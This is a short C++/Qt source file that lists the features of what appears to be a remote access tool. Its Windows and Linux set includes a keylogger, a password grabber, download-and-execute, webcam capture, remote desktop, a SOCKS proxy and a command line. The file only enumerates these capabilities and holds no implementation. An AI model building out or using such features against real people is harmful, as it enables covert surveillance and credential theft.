#include "features.h"

#define x(n) QString Features::n = #n;
FOR_EACH_FEATURES(x)
#undef x

Features::Features()
{

}

QStringList Features::currentPlatformFeatures()
{
#ifdef Q_OS_WIN
    return windowsFeatures();
#endif
#ifdef Q_OS_LINUX
#   ifdef Q_OS_ANDROID
#   else
    return linuxFeatures();
#   endif
#endif
}

QStringList Features::windowsFeatures()
{
    auto fs = windowsLinuxCommonFeatures();
    fs.append(Registry);
    return fs;
}

QStringList Features::linuxFeatures()
{
    return windowsLinuxCommonFeatures();
}

QStringList Features::androidFeatures()
{
    return QStringList();
}

QStringList Features::macosFeatures()
{
    return QStringList();
}

QStringList Features::windowsLinuxCommonFeatures()
{
    QStringList features;
    features.append(Features::FileManager);
    features.append(Features::FileTransfer);
    features.append(Features::StartupManager);
    features.append(Features::TaskManager);
    features.append(Features::Webcam);
    features.append(Features::SystemInformations);
    features.append(Features::SocksProxy);
    features.append(Features::KeyLogger);
    features.append(Features::BrowserTabs);
    features.append(Features::Power);
    features.append(Features::CommandLine);
    features.append(Features::OpenUrl);
    features.append(Features::MessageBox);
    features.append(Features::DownloadAndExec);
    features.append(PassworgGraber);
#ifdef QT_GUI_LIB
    features.append(Features::Screenshot);
    features.append(Features::RemoteDesktop);
#endif
#ifdef QT_WIDGETS_LIB
    features.append(Features::LockScreen);
#endif
    return features;
}
